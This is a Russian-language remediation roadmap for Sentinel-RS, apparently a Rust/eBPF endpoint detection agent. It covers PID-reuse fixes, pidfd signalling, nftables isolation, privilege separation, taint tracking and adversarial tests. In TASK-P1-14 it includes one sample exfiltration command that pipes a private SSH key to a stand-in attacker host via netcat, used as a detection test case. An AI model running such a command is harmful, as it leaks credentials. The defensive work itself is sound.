# Дорожная карта и реестр задач Sentinel-RS (TASKS_ROADMAP)

Документ представляет собой пошаговый план исправления Sentinel-RS, сформированный на основе технического аудита. Задачи сгруппированы по фазам и приоритетам (P0 -> P1 -> P2 -> P3) с явным указанием зависимостей, конкретных файлов для изменения, методов проверки и критериев приёмки.

---

## Статусы задач
- `[ ] TODO` — задача запланирована, реализация не начата.
- `[~] IN_PROGRESS` — задача в процессе реализации.
- `[?] VERIFY` — код написан, требуется проверка/тестирование в среде Linux/eBPF.
- `[X] DONE` — задача полностью реализована, протестирована и принята по критериям.

---

## Фаза 1. Безопасность процессов и предотвращение PID Reuse (P0 · Немедленно)

### [X] TASK-P0-01: Единая структура `ProcessIdentity` и composite key в Lineage
- **Проблема:** В `crates/sentineld/src/lineage/graph.rs` граф `LineageGraph` хранит процессы в `LruCache<u32, ProcessNode>` по сырому `tgid` (u32). При повторном использовании PID ядром старый процесс в кеше перезаписывается или ассоциируется с новым, приводя к коллизиям и ложным связям в DAG.
- **Решение:**
  1. В `crates/sentinel-common/src/process.rs` и `crates/sentineld/src/lineage/process_key.rs` расширить `ProcessIdentity` / `ProcessKey`:
     ```rust
     #[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
     pub struct ProcessIdentity {
         pub pid: u32,
         pub tgid: u32,
         pub start_time_ns: u64,
         pub pid_namespace: u64,
         pub exe_path: Option<PathBuf>,
         pub dev_ino: Option<(u64, u64)>,
     }
     ```
  2. Перевести `LineageGraph` с `LruCache<u32, ProcessNode>` на `LruCache<ProcessKey, ProcessNode>` (или двухуровневый индекс `tgid -> HashSet<ProcessKey>`).
- **Файлы:**
  - `crates/sentinel-common/src/process.rs`
  - `crates/sentineld/src/lineage/process_key.rs`
  - `crates/sentineld/src/lineage/graph.rs`
  - `crates/sentineld/src/lineage/tracker.rs`
- **Проверка:** Unit-тест: создание двух процессов с одинаковым PID, но разным `start_time_ns` — оба сохраняются в графе без взаимной перезаписи.
- **Критерий приёмки:** PID reuse не приводит к смешиванию истории процессов в LineageGraph.

---

### [X] TASK-P0-02: Устранение TOCTOU гонки и переход на `pidfd` в реагировании
- **Проблема:** В `crates/sentineld/src/response/process_term.rs`:
  1. `safe_terminate_process` вызывает `kill(SIGSTOP)` ДО проверки `verify_process_identity`. Если PID уже был переиспользован ядром, замораживается невиновный системный процесс.
  2. Завершение процесса использует `nix::sys::signal::kill(pid, ...)`, подверженное классической гонке TOCTOU.
- **Решение:**
  1. Реализовать работу через Linux `pidfd`:
     - Вызов `pidfd_open(pid, 0)` -> получение файлового дескриптора конкретного экземпляра процесса.
     - Чтение `/proc/self/fd/<pidfd>/stat` или сравнение `start_time` через pidfd.
     - Отправка сигналов через `pidfd_send_signal(pidfd, sig, NULL, 0)`.
  2. Перестроить порядок операций:
     `pidfd_open` -> `verify_identity(pidfd)` -> `pidfd_send_signal(SIGSTOP)` -> `verify_identity_post_freeze` -> `pidfd_send_signal(SIGTERM/SIGKILL)`.
  3. Если `pidfd_open` недоступен (ядра < 5.3), проверять `/proc/<pid>/stat` ДО первого сигнала с возвратом `Err(PidReuseDetected)` без отправки сигналов.
- **Файлы:**
  - `crates/sentineld/src/response/process_term.rs`
  - `crates/sentineld/src/response/process_suspend.rs`
- **Проверка:** Тест SEC-001 (создать процесс, завершить, подменить PID другим легитимным процессом, вызвать terminate) — сигнал не должен уйти новому процессу.
- **Критерий приёмки:** Ошибка проверки идентичности приводит к немедленному отказу от воздействия без побочных эффектов для чужих процессов.

---

### [X] TASK-P0-03: Политика защиты критических системных процессов (`ProcessProtectionPolicy`)
- **Проблема:** Текущий список неприкосновенных процессов (`default_never_freeze_list`) проверяет только строковые имена (`systemd`, `sshd`, `sentineld`). Злоумышленник может назвать вредоносный бинарник `sshd` и обойти завершение.
- **Решение:**
  1. Создать модуль `ProcessProtectionPolicy`, проверяющий:
     - Имя исполняемого файла;
     - Канонический путь бинарника (`/usr/lib/systemd/systemd`, `/usr/sbin/sshd`);
     - Inode бинарника на доверенной ФС;
     - Принадлежность к DPKG/RPM базе доверенных пакетов;
     - Идентичность самого Sentinel-RS (собственный PID, tgid, бинарник).
  2. Запретить автоматический `kill`/`suspend` для любых системно-критических процессов, заменяя действие на `Alert` и изоляцию сетевых сокетов при угрозе.
- **Файлы:**
  - `crates/sentineld/src/protection.rs`
  - `crates/sentineld/src/freeze.rs`
  - `crates/sentineld/src/response/orchestrator.rs`
- **Проверка:** Попытка завершения процесса с именем `sshd`, запущенного из `/tmp/sshd`, должна успешно блокироваться/завершаться, а настоящий системный `/usr/sbin/sshd` защищен.
- **Критерий приёмки:** Невозможно обмануть защиту критических процессов простой подменой имени процесса (argv[0]/comm).

---

## Фаза 2. Сетевая изоляция и транзакции nftables (P0 · Немедленно)

### [X] TASK-P0-04: Транзакционный Network Isolation Manager с 3 уровнями изоляции
- **Проблема:** `crates/sentineld/src/network/nftables.rs` выполняет прямые вызовы CLI `Command::new("nft")` без проверки целостности существующих правил, без транзакционности и без валидации состояния сети.
- **Решение:**
  1. Выделить `NetworkIsolationManager` со строгими режимами:
     - `Selective`: блокировка конкретного вредоносного сокета/порта/процесса.
     - `Restricted`: разрешение только служебных соединений (DNS, Sentinel C2, локальный loopback, SSH с доверенной подсети).
     - `FullIsolation`: полная изоляция хоста с сохранением только loopback и аварийного канала восстановления.
  2. Использовать пакетную генерацию правил nftables (batch commands) через stdin или netlink-транзакции.
  3. Никогда не выполнять `nft flush ruleset`! Работать исключительно внутри таблицы `inet sentinel`.
- **Файлы:**
  - `crates/sentineld/src/network/nftables.rs`
  - `crates/sentineld/src/network/manager.rs`
  - `crates/sentineld/src/network/policy.rs`
- **Проверка:** Изоляция хоста не затирает правила Docker/Kubernetes/UFW в других таблицах.
- **Критерий приёмки:** Все изменения nftables изолированы в таблице `inet sentinel` и применяются атомарно.

---

### [X] TASK-P0-05: Аварийный механизм отката сетевой изоляции (Anti-Lockout Timer)
- **Проблема:** Случайная или ошибочная изоляция удаленного сервера приводит к потере SSH-доступа без возможности локального восстановления (bricked remote server).
- **Решение:**
  1. Реализовать механизм временной изоляции (Timed Isolation):
     - При включении изоляции запускается локальный таймер (по умолчанию 300 секунд).
     - Если оператор не прислал подтверждение (`sntctl network confirm-isolation`) до истечения таймера, демон автоматически восстанавливает сетевой доступ к предыдущему состоянию.
  2. Явное исключение для текущих установленных SSH-сессий (`ct state established,related accept` на порт 22 с доверенных IP).
- **Файлы:**
  - `crates/sentineld/src/network/manager.rs`
  - `crates/sentineld/src/network/nftables.rs`
  - `crates/sntctl/src/commands/`
- **Проверка:** Тест: включить изоляцию без подтверждения — через N секунд правила откатываются, доступ восстанавливается.
- **Критерий приёмки:** Изоляция не блокирует канал восстановления администратора и откатывается по таймауту при потере связи.

---

## Фаза 3. Отказоустойчивость, Watchdog и машина состояний (P0 · Немедленно)

### [X] TASK-P0-06: Формальная машина состояний агента (`AgentState`) и `FailurePolicyManager`
- **Проблема:** Заявленный в документации `fail-closed` противоречит fallback-логике. При отказе одного из компонентов (eBPF, RingBuffer, SQLite) система переходит в неопределенное состояние.
- **Решение:**
  1. Ввести явную машину состояний:
     ```rust
     #[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
     pub enum AgentState {
         Starting,
         Healthy,
         Degraded,
         ProtectionUnavailable,
         Recovering,
         Stopping,
     }
     ```
  2. Реализовать `FailurePolicyManager`, определяющий правила:
     - Сбой RingBuffer -> `Degraded` (телеметрия потеряна, но сетевой фильтр активен).
     - Сбой BPF LSM -> `ProtectionUnavailable` (прекращение блокировок, явное оповещение оператора).
     - Сбой SQLite -> `Degraded` (буферизация событий в ОЗУ до лимита).
     - Сбой IPC -> блокировка новых привилегированных команд.
- **Файлы:**
  - `crates/sentinel-common/src/health.rs`
  - `crates/sentineld/src/health/degraded.rs`
  - `crates/sentineld/src/health/monitor.rs`
  - `crates/sentineld/src/health/mod.rs`
- **Проверка:** Имитация отказа SQLite или BPF переводит статус в Degraded/ProtectionUnavailable без паники и с корректным выводом в `sntctl status`.
- **Критерий приёмки:** Система никогда не сообщает `Healthy`, если ключевой защитный механизм отключен или неисправен.

---

### [X] TASK-P0-07: Исправление systemd watchdog (устранение безусловного heartbeats)
- **Проблема:** В `crates/sentineld/src/health/watchdog.rs` метод `notify_watchdog` запускается в фоновом потоке и каждые N секунд безусловно шлёт `WATCHDOG=1` в systemd, даже если демон завис внутри eBPF или потерял контроль над ядром.
- **Решение:**
  1. Связать отправку `WATCHDOG=1` с реальной проверкой здоровья всех подсистем (`HealthMonitor::check_all()`):
     - Проверка ответа RingBuffer;
     - Проверка доступности Tokio runtime;
     - Проверка живости потоков обработки;
     - Проверка BPF map counters.
  2. Если подсистема зависла или состояние `ProtectionUnavailable` длится дольше допустимого порога — ПРЕКРАТИТЬ пинать watchdog, чтобы systemd мог перезапустить процесс по правилам службы.
  3. Отправлять `READY=1` строго после полной инициализации всех карт eBPF и nftables.
  4. Отправлять `STOPPING=1` при получении SIGTERM.
- **Файлы:**
  - `crates/sentineld/src/health/watchdog.rs`
  - `crates/sentineld/src/health/monitor.rs`
  - `crates/sentineld/src/main.rs`
- **Проверка:** Принудительная блокировка очереди обработки событий останавливает heartbeat; systemd регистрирует watchdog timeout.
- **Критерий приёмки:** Watchdog подтверждает фактическую работоспособность защиты, а не просто работу одного изолированного потока.

---

## Фаза 4. Модель привилегий и разделение демона (P0 · Критический приоритет)

### [X] TASK-P0-08: Архитектурное разделение `sentinel-privileged` и `sentineld-core`
- **Проблема:** Демон `sentineld` запускается с полным набором `CAP_BPF CAP_PERFMON CAP_NET_ADMIN CAP_SYS_ADMIN CAP_SYS_PTRACE CAP_DAC_READ_SEARCH CAP_KILL`. При уязвимости в коде парсинга событий или аналитике злоумышленник получает полный контроль над системой.
- **Решение:**
  1. Разделить систему на два процесса:
     - `sentinel-privileged` (минимальный доверенный helper с CAP_BPF, CAP_NET_ADMIN, CAP_KILL): загрузка eBPF программ, транзакции nftables, pidfd_send_signal по запросу.
     - `sentineld-core` (непривилегированный аналитический демон): DAG процессов, Taint tracking, Risk Engine, SQLite, IPC сервер для пользователей.
  2. Взаимодействие через локальный защищенный сокет/pipe с проверкой команд и параметров.
- **Файлы:**
  - `Cargo.toml`
  - `crates/sentinel-privileged/` (новый crate)
  - `crates/sentineld/src/` (очистка от прямых системных мутаций)
- **Проверка:** Компрометация userspace-парсера событий `sentineld-core` не дает прав на произвольную модификацию nftables или чтение произвольных файлов ядра.
- **Критерий приёмки:** Аналитический движок не обладает прямыми административными привилегиями.

---

### [X] TASK-P0-09: Минимизация capabilities и аудит systemd unit
- **Проблема:** Наличие `CAP_SYS_ADMIN` и `CAP_SYS_PTRACE` в `AmbientCapabilities` и `CapabilityBoundingSet` нарушает принцип наименьших привилегий (least privilege).
- **Решение:**
  1. Изъять `CAP_SYS_ADMIN` из `sentineld.service`.
  2. Ограничить `CAP_SYS_PTRACE` (использовать eBPF hooks и pidfd вместо ptrace).
  3. Оставить только строго необходимые capabilities для соответствующих бинарников:
     - BPF loader: `CAP_BPF`, `CAP_PERFMON`.
     - Network control: `CAP_NET_ADMIN`.
     - Process termination: `CAP_KILL`.
  4. Проверить `ProtectHome=read-only` на совместимость с контролем доступа к секретам (`~/.ssh`, `~/.gnupg`).
- **Файлы:**
  - `config/sentineld.service`
  - `docs/INSTALLATION.md`
  - `docs/SECURITY_MODEL.md`
- **Проверка:** Демон успешно запускается и функционирует без `CAP_SYS_ADMIN`.
- **Критерий приёмки:** `capsh` / `getpcaps` для процесса подтверждает отсутствие неиспользуемых capabilities.

---

## Фаза 5. Стабильный ABI eBPF и обработка потока событий (P1 · Высокий приоритет)

### [X] TASK-P1-10: C-совместимый ABI (`#[repr(C)]`) для RingBuffer без heap-типов
- **Проблема:** В `crates/sentinel-common/src/events.rs` структура `EbpfEvent` содержит `PathBuf` и `enum`, которые не имеют стабильного представления в C и требуют динамического выделения памяти в куче Rust. eBPF ядро не может напрямую писать в такую структуру.
- **Решение:**
  1. Описать строгие `#[repr(C)]` структуры сырых событий из ядра:
     ```rust
     #[repr(C)]
     #[derive(Debug, Clone, Copy)]
     pub struct RawEbpfHeader {
         pub event_type: u32,
         pub cpu_id: u32,
         pub timestamp_ns: u64,
         pub pid: u32,
         pub tgid: u32,
         pub uid: u32,
     }
     
     #[repr(C)]
     #[derive(Debug, Clone, Copy)]
     pub struct RawFileOpenEvent {
         pub header: RawEbpfHeader,
         pub flags: u32,
         pub dev: u64,
         pub ino: u64,
         pub path_len: u32,
         pub path: [u8; 256],
     }
     ```
  2. Преобразование в удобный userspace-тип (`NormalizedEvent`) выполнять на стадии нормализации в `event_normalizer.rs`.
- **Файлы:**
  - `crates/sentinel-common/src/events.rs`
  - `crates/sentinel-ebpf/src/`
  - `crates/sentineld/src/collector/event_normalizer.rs`
- **Проверка:** Десериализация из сырого слайса байтов ядра без UB и с проверкой выравнивания (alignment).
- **Критерий приёмки:** ABI между ядром eBPF и userspace строго фиксирован и не зависит от компилятора Rust.

---

### [X] TASK-P1-11: Измерение потерь событий из RingBuffer и защита от DoS
- **Проблема:** При интенсивной генерации событий (flood системных вызовов) RingBuffer переполняется. События молча отбрасываются, создавая "слепое пятно" для EDR, а метрики не регистрируют потери со стороны ядра.
- **Решение:**
  1. Добавить ядерный BPF map со счетчиками отброшенных событий (`BPF_MAP_TYPE_PERCPU_ARRAY` / `drop_counters`).
  2. В `RingBufferConsumer` считывать счетчики ядра и сопоставлять со статистикой userspace.
  3. Реализовать Rate Limiting и Backpressure:
     - Ограничение частоты генерации событий от одного PID/cgroup.
     - Приоритезация критических событий (доступ к секретам, memfd, ptrace) перед частыми (обычный fork/exec).
     - При потере событий автоматически переводить статус в `Degraded` с записью в audit log.
- **Файлы:**
  - `crates/sentinel-ebpf/src/maps.rs`
  - `crates/sentineld/src/collector/ringbuffer.rs`
  - `crates/sentineld/src/collector/event_metrics.rs`
- **Проверка:** Тест SEC-003 (генерация 100 000 fork/exec в секунду) — регистрируется точное число потерянных событий, статус демона переходит в Degraded, система не падает по OOM.
- **Критерий приёмки:** Потери телеметрии явно регистрируются и влияют на статус системы.

---

### [X] TASK-P1-12: Матрица профилей совместимости ядер (Linux 6.1+, 5.15–6.0, 5.10–5.14)
- **Проблема:** Разные версии ядра Linux имеют разную поддержку BPF LSM, BPF RingBuffer и аргументов hooks. Попытка запуска на неподдерживаемом ядре может приводить к аварийному завершению.
- **Решение:**
  1. Реализовать предварительную проверку (preflight probe) возможностей ядра до запуска eBPF:
     - Наличие BPF LSM в `/sys/kernel/security/lsm`;
     - Доступность RingBuffer (Linux >= 5.8);
     - Поддержка `task_storage` / `bpf_task_storage_get`;
     - Наличие BTF (`/sys/kernel/btf/vmlinux`).
  2. Определить 3 профиля:
     - `Tier 1 (Linux 6.1+)`: Полная функциональность (LSM, RingBuffer, BPF timers, pidfd).
     - `Tier 2 (Linux 5.15–6.0)`: Проверяемая совместимость.
     - `Tier 3 (Linux 5.10–5.14)`: Ограниченная совместимость (без BPF LSM, только tracepoints + NFQUEUE).
- **Файлы:**
  - `crates/sentineld/src/preflight.rs`
  - `docs/EBPF_COMPATIBILITY.md`
- **Проверка:** Запуск preflight-проверки на целевой ОС возвращает точный профиль и корректные рекомендации.
- **Критерий приёмки:** Несовместимость ядра выявляется до включения режима защиты с понятным сообщением об ошибке.

---

## Фаза 6. Taint Tracking и двухуровневый Process Lineage (P1 · Высокий приоритет)

### [X] TASK-P1-13: Типизированная модель Taint (`TaintLevel` и `SensitiveSource`)
- **Проблема:** Текущая реализация использует упрощенный флаг или нетипизированный список доступа. Любое чтение файла расценивается как безусловный taint, приводя к ложным срабатываниям на легитимных утилитах бэкапа.
- **Решение:**
  1. Ввести строгие перечисления уровней и источников:
     ```rust
     #[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
     pub enum TaintLevel {
         None,
         Observed,
         SensitiveAccess,
         SuspectedPropagation,
         ConfirmedPropagation,
     }

     #[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
     pub enum SensitiveSource {
         SshPrivateKey,
         GpgKey,
         BrowserVault,
         CryptoWallet,
         CloudToken,
         CustomPath(PathBuf),
     }
     ```
  2. Связать каждое повышение уровня taint с контекстом: метка времени, дескриптор объекта, уровень доверия к процессу.
- **Файлы:**
  - `crates/sentinel-common/src/process.rs`
  - `crates/sentinel-common/src/events.rs`
  - `crates/sentineld/src/lineage/mod.rs`
- **Проверка:** Различение между простым чтением SSH ключа процессом резервного копирования (`SensitiveAccess`) и передачей его через pipe в неподписанный curl (`ConfirmedPropagation`).
- **Критерий приёмки:** Отсутствие бинарного схлопывания всех сценариев в один `is_tainted: bool`.

---

### [X] TASK-P1-14: Разделение графа на Process Graph и Data Flow Graph
- **Проблема:** В `crates/sentineld/src/lineage/` история процессов и передача данных смешаны в одну структуру `ProcessNode`, что затрудняет анализ сложных цепочек IPC (fork -> pipe -> socket -> exec).
- **Решение:**
  1. Реализовать два связанных графа:
     - **Process Graph**: узлы — экземпляры процессов (`ProcessKey`), ребра — `Fork`, `Exec`, `Exit`.
     - **Data Flow Graph**: узлы — объекты (секреты, каналы, файлы, сетевые сокеты), ребра — `Read`, `Write`, `SendMsg`, `RecvMsg`, `FdPass`.
  2. Инцидент формируется на основе сопоставления путей в Data Flow графе с жизненным циклом в Process графе.
- **Файлы:**
  - `crates/sentineld/src/lineage/graph.rs`
  - `crates/sentineld/src/lineage/tracker.rs`
- **Проверка:** Построение цепочки `cat ~/.ssh/id_rsa | nc attacker.com 1337`: Process Graph показывает два сестринских процесса от bash, а Data Flow Graph показывает ребро передачи данных через pipe.
- **Критерий приёмки:** Анализ инцидента точно указывает способ передачи данных, а не просто общий родительский процесс.

---

### [X] TASK-P1-15: Матрица поддержки IPC механизмов (pipe, socket, SCM_RIGHTS, memfd)
- **Проблема:** Заявлена поддержка IPC-распространения, но не для всех механизмов есть четкие границы применимости и тестовое покрытие.
- **Решение:**
  1. Реализовать явную матрицу поддерживаемых механизмов:
     - `pipe` / `fifo`: поддерживается через eBPF `lsm/file_permission` (полная трассировка).
     - `unix domain socket`: поддерживается через `lsm/unix_may_send` и `lsm/socket_sendmsg`.
     - `SCM_RIGHTS`: передача FD дескрипторов отслеживается через `lsm/file_receive`.
     - `memfd_create`: отслеживается через `lsm/bprm_check_security`.
     - `shared memory (shmget/mmap)`: частичная поддержка / обнаружение через `lsm/mmap_file`.
  2. Задокументировать ограничения каждого механизма в документации.
- **Файлы:**
  - `crates/sentinel-ebpf/src/programs/`
  - `crates/sentineld/src/lineage/tracker.rs`
  - `docs/ARCHITECTURE.md`
- **Проверка:** Тесты SEC-011 (передача дескриптора через SCM_RIGHTS) — taint корректно наследуется принимающим процессом.
- **Критерий приёмки:** Все поддерживаемые механизмы протестированы, неподдерживаемые явно задокументированы как ограничения.

---

## Фаза 7. Evidence-Based Risk Engine и объяснимость решений (P1 · Высокий приоритет)

### [X] TASK-P1-16: Evidence-Based Risk Engine (Evidence, Confidence, Impact)
- **Проблема:** В `crates/sentineld/src/risk/engine.rs` решение принимается простым сложением числовых весов (`50 + 35 + ...`). Сумма баллов не объясняет причинно-следственную связь и приводит к ложным срабатываниям на скриптах администрирования.
- **Решение:**
  1. Перевести Risk Engine на трехуровневую модель:
     - **Evidence**: подтвержденные факты (доступ к приватному ключу, неподписанный бинарник, отправка сетевого пакета).
     - **Confidence**: степень достоверности связи (прямой вызов — 1.0, косвенная передача через IPC — 0.7, предположение — 0.4).
     - **Impact**: потенциальный ущерб (утечка мастер-ключа vs обращение к локальному DNS).
  2. Автоматическое завершение процесса разрешать только при одновременном соблюдении критериев: `Impact == Critical && Confidence >= High && Evidence.contains(ConfirmedPropagation)`.
- **Файлы:**
  - `crates/sentinel-common/src/risk.rs`
  - `crates/sentineld/src/risk/engine.rs`
  - `crates/sentineld/src/risk/evidence.rs`
- **Проверка:** Тест: легитимный backup-скрипт получает высокий суммарный счет обращений, но `Confidence` в эксфильтрации нулевой -> процесс не завершается, создается только наблюдаемое событие (`Observe`).
- **Критерий приёмки:** Завершение процесса никогда не инициируется исключительно числовым порогом без проверки достоверности доказательств.

---

### [X] TASK-P1-17: Разделение обнаружения (Detection) и авторизации реагирования (Policy)
- **Проблема:** Risk Engine и компоненты реагирования тесно связаны, что создает риск несанкционированного вызова блокировок.
- **Решение:**
  1. Четко разделить конвейер:
     `NormalizedEvent` -> `RiskEngine (Evidence Evaluation)` -> `PolicyEngine (Authorization Check)` -> `ResponseOrchestrator (Execution via Privileged Component)`.
  2. Каждое решение формирует структуру `DecisionRecord` с полной трассировкой (версия политики, доказательства, мотивировка, подпись).
- **Файлы:**
  - `crates/sentineld/src/policy/engine.rs`
  - `crates/sentineld/src/response/orchestrator.rs`
- **Проверка:** Вызов RiskEngine в изолированном unit-тесте возвращает только оценку и не выполняет никаких системных вызовов реагирования.
- **Критерий приёмки:** Четкое разделение ответственности без побочных эффектов в аналитическом движке.

---

## Фаза 8. Безопасность IPC и надежность SQLite (P1 · Высокий приоритет)

### [X] TASK-P1-18: Защита IPC от DoS, ограничение размера сообщений и версионирование
- **Проблема:** В `crates/sentineld/src/ipc_server.rs` чтение из сокета происходит через `BufReader::read_line` без лимита на длину строки. Злоумышленник может отправить непрерывный поток байт без перевода строки и вызвать исчерпание памяти (OOM DoS).
- **Решение:**
  1. Ввести жесткое ограничение на размер входящего сообщения (например, максимум 64 КБ):
     ```rust
     let mut take_reader = reader.take(65536);
     ```
  2. Добавить таймаут на чтение запроса (`tokio::time::timeout(5s, ...)`).
  3. Проверять версию протокола в каждом `IpcEnvelope`.
  4. Обеспечить строгую привязку прав к реальному `SO_PEERCRED` UID/GID, запретив любые параметры "is_admin" из тела запроса.
- **Файлы:**
  - `crates/sentineld/src/ipc_server.rs`
  - `crates/sentinel-common/src/ipc.rs`
- **Проверка:** Тест SEC-005 (отправка 10 МБ мусора без переноса строки) — соединение мгновенно сбрасывается с ошибкой `MessageTooLarge`, память демона не растет.
- **Критерий приёмки:** IPC устойчив к DoS-атакам и некорректным входным данным.

---

### [X] TASK-P1-19: Управление жизненным циклом SQLite (Retention, Quota, Checkpoints)
- **Проблема:** SQLite база может бесконтрольно разрастаться при активной генерации событий, что приведет к заполнению диска (`No space left on device`) и остановке хоста.
- **Решение:**
  1. Реализовать автоматическую политику хранения (Retention Policy):
     - Удаление сырых событий старше N дней (по умолчанию 14 дней).
     - Хранение критических инцидентов и записей аудита отдельно с увеличенным сроком.
  2. Регулярный `PRAGMA wal_checkpoint(TRUNCATE)` для предотвращения разрастания WAL-файла.
  3. Проверка остатка свободного места на диске перед записью: при остатке < 500 МБ прекращать запись сырых событий и переходить в аварийный режим с сохранением только критических алертов.
- **Файлы:**
  - `crates/sentineld/src/storage/database.rs`
  - `crates/sentineld/src/storage/migrations.rs`
- **Проверка:** Тест SEC-009 (эмуляция заполненного диска) — демон фиксирует ошибку квоты, не падает с panic и сохраняет статус работоспособности.
- **Критерий приёмки:** Размер БД ограничен квотой, старые записи ротируются автоматически.

---

## Фаза 9. Набор Adversarial-тестов и CI/CD матрица (P0/P1 · Обязательное условие)

### [X] TASK-P0-20: Набор adversarial-тестов SEC-001 — SEC-012 в изолированной VM
- **Проблема:** Существующие unit-тесты проверяют лишь внутреннюю логику Rust-структур, но не проверяют устойчивость к реальным атакам и гонкам в среде Linux.
- **Решение:**
  Реализовать и включить в сценарии проверки (`tests/adversarial/`):
  - `SEC-001`: PID reuse — отсутствие воздействия на новый чужой процесс.
  - `SEC-002`: Непривилегированный IPC-клиент — отказ в выполнении административной команды.
  - `SEC-003`: Переполнение RingBuffer — фиксация потери событий и переход в Degraded.
  - `SEC-004`: Потеря BPF LSM — корректный переход в ProtectionUnavailable.
  - `SEC-005`: Поврежденное / гигантское IPC-сообщение — безопасный сброс без OOM.
  - `SEC-006`: Несанкционированная изоляция сети — отказ операции.
  - `SEC-007`: Аварийное завершение демона (`kill -9`) — чистое восстановление при перезапуске.
  - `SEC-008`: Повторная команда изоляции — идемпотентность правил nftables.
  - `SEC-009`: Заполнение дискового пространства — контролируемая деградация без повреждения базы.
  - `SEC-010`: Массовый fork-bomb — защита ресурсов демона.
  - `SEC-011`: Передача файлового дескриптора через SCM_RIGHTS — корректное наследование taint.
  - `SEC-012`: Легитимный процесс бэкапа (tar/rsync ключей) — отсутствие ложной блокировки.
- **Файлы:**
  - `tests/adversarial/` (новые интеграционные тесты)
  - `tests/run_live_vm_tests.sh`
- **Проверка:** Прогон тестов в VM через `vmtest` или QEMU/KVM.
- **Критерий приёмки:** Все 12 тестов SEC-001 — SEC-012 проходят успешно.

---

### [X] TASK-P1-21: CI/CD пайплайн и замеры производительности (SLA)
- **Проблема:** Отсутствуют строгие автоматизированные замеры накладных расходов (CPU overhead, memory footprint, detection/response latency).
- **Решение:**
  1. Настроить GitHub Actions workflow с шагами:
     - `cargo fmt --check`
     - `cargo clippy --all-targets -- -D warnings`
     - `cargo audit` & `cargo deny check`
     - Unit & Integration tests
     - `vmtest` с ядром Linux 6.1+
  2. Зафиксировать допустимые метрики SLA:
     - CPU Overhead <= 2.5% при 10k syscall/sec;
     - Memory Footprint <= 64 MB RSS;
     - Detection Latency <= 1.0 ms;
     - Response Latency <= 5.0 ms.
- **Файлы:**
  - `.github/workflows/ci.yml`
  - `benches/`
- **Проверка:** Запуск бенчмарков с выводом реальных показателей задержки и потребления ресурсов.
- **Критерий приёмки:** Все тесты проходят в CI, накладные расходы подтверждены метриками.

---

## Фаза 10. Документация и приведение в соответствие с кодом (P2 · Средний приоритет)

### [X] TASK-P2-22: Документ `IMPLEMENTATION_STATUS.md` с объективным статусом
- **Проблема:** Документация описывает желаемое целевое состояние системы как уже функционирующее, что искажает реальную степень готовности продукта.
- **Решение:**
  1. Создать `docs/IMPLEMENTATION_STATUS.md` с честной матрицей готовности всех компонентов:
     - `Implemented & Tested`
     - `Implemented & Untested`
     - `Partial`
     - `Experimental`
     - `Planned`
  2. Обновить ссылки в `README.md` и `README.en.md`.
- **Файлы:**
  - `docs/IMPLEMENTATION_STATUS.md` (создан)
  - `README.md`
  - `README.en.md`
- **Проверка:** Проверка соответствия каждого пункта в таблице реальному состоянию кодовой базы.
- **Критерий приёмки:** Отсутствие нерелевантных или преждевременных заявлений о безопасности в документации. Статус зафиксирован.

---

### [X] TASK-P2-23: Согласование unit-файла systemd и руководств по эксплуатации
- **Проблема:** Расхождения между документацией (`Type=notify`, `WatchdogSec=30s`) и фактическим unit-файлом `config/sentineld.service` (`WatchdogSec=15s`, `Type=notify`, разный состав sandbox-директив).
- **Решение:**
  1. Синхронизировать `config/sentineld.service`, `docs/ARCHITECTURE.md`, `docs/INSTALLATION.md`.
  2. Документировать все требования к правам, ядру и исключениям для sandbox-изоляции.
- **Файлы:**
  - `config/sentineld.service`
  - `docs/ARCHITECTURE.md`
  - `docs/INSTALLATION.md`
  - `docs/SECURITY_MODEL.md`
- **Проверка:** Сверка параметров службы в коде и документах.
- **Критерий приёмки:** Полное совпадение параметров во всех артефактах репозитория.

---

## Порядок выполнения задач (Execution Order)

```
[TASK-P2-22] Создание честного статуса реализации (docs/IMPLEMENTATION_STATUS.md)
     │
     ▼
[TASK-P0-01] Composite ProcessKey & ProcessIdentity в LineageGraph
     │
     ▼
[TASK-P0-02] pidfd_open / pidfd_send_signal & устранение TOCTOU гонки
     │
     ▼
[TASK-P0-03] ProcessProtectionPolicy (защита критических процессов)
     │
     ▼
[TASK-P0-04] Транзакционный Network Isolation Manager (3 уровня изоляции)
     │
     ▼
[TASK-P0-05] Anti-Lockout таймер отката сетевой изоляции
     │
     ▼
[TASK-P0-06] Машина состояний AgentState & FailurePolicyManager
     │
     ▼
[TASK-P0-07] Связывание systemd watchdog с реальным здоровьем подсистем
     │
     ▼
[TASK-P0-08] Архитектурное выделение sentinel-privileged helper
     │
     ▼
[TASK-P0-09] Минимизация capabilities (изъятие CAP_SYS_ADMIN)
     │
     ▼
[TASK-P1-10] C-совместимый #[repr(C)] ABI для eBPF событий
     │
     ▼
[TASK-P1-11] Детекция переполнения RingBuffer, подсчет потерь и DoS backpressure
     │
     ▼
[TASK-P1-12] Preflight-проверка ядра и профили совместимости
     │
     ▼
[TASK-P1-13] Типизированная модель TaintLevel и SensitiveSource
     │
     ▼
[TASK-P1-14] Разделение Process Graph и Data Flow Graph
     │
     ▼
[TASK-P1-15] Матрица IPC-механизмов и тестовое покрытие
     │
     ▼
[TASK-P1-16] Evidence-Based Risk Engine (Evidence, Confidence, Impact)
     │
     ▼
[TASK-P1-17] Разделение Detection и Response Authorization
     │
     ▼
[TASK-P1-18] Защита IPC от DoS, лимит на размер буфера и версионирование
     │
     ▼
[TASK-P1-19] SQLite retention policy, WAL checkpointing и проверка квот
     │
     ▼
[TASK-P0-20] Набор тестов SEC-001 — SEC-012
     │
     ▼
[TASK-P1-21] CI/CD пайплайн и SLA бенчмарки
     │
     ▼
[TASK-P2-23] Согласование документации и unit-файла systemd
```
